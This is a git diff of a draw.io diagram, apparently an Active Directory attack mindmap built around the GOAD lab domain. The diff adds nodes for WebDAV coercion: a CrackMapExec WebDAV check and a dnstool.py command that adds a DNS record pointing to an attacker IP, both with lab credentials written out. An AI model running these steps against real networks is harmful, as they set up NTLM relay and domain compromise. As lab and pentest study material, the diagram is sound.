@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2024-07-17T13:44:59.173Z" agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0" etag="v7Q9x98jPXo9CmFPFPks" version="24.7.0" type="github" pages="7">
+<mxfile host="app.diagrams.net" modified="2024-07-17T13:47:54.235Z" agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0" etag="Pm4X-KvwhmYW6FtrioqX" version="24.7.0" type="github" pages="7">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -527,9 +527,22 @@
         <mxCell id="g4OTAGMWRYiCXh_OqpCy-4" value="DC sync if DCs have not signing required" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;fillColor=#f8cecc;strokeColor=#b85450;" parent="1" vertex="1">
           <mxGeometry x="1534" y="760" width="220" height="80" as="geometry" />
         </mxCell>
-        <mxCell id="TZx4k0LZ_Z577zQX7S4p-2" value="COERCE WEBDAV HTTP" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-          <mxGeometry x="90" y="995" width="120" height="60" as="geometry" />
+        <mxCell id="TZx4k0LZ_Z577zQX7S4p-4" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="TZx4k0LZ_Z577zQX7S4p-2" target="TZx4k0LZ_Z577zQX7S4p-3">
+          <mxGeometry relative="1" as="geometry" />
         </mxCell>
+        <mxCell id="TZx4k0LZ_Z577zQX7S4p-2" value="COERCE WEBDAV HTTP" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="120" y="1070" width="120" height="60" as="geometry" />
+        </mxCell>
+        <object label="&lt;div&gt;Check if webdav enabled&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;cme&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="cme smb 192.168.10.10-23 -u arya.stark -p &#39;Needle&#39; -d north.sevenkingdoms.local -M webdav" id="TZx4k0LZ_Z577zQX7S4p-3">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
+            <mxGeometry x="280" y="1070" width="120" height="60" as="geometry" />
+          </mxCell>
+        </object>
+        <object label="add dns entry for atatcker ip" cmd="dnstool.py -u &#39;north.sevenkingdoms.local\arya.stark&#39; -p Needle --record &#39;responder&#39; --action add --data 10.10.10.6 192.168.10.11" id="TZx4k0LZ_Z577zQX7S4p-5">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
+            <mxGeometry x="440" y="1070" width="120" height="60" as="geometry" />
+          </mxCell>
+        </object>
       </root>
     </mxGraphModel>
   </diagram>
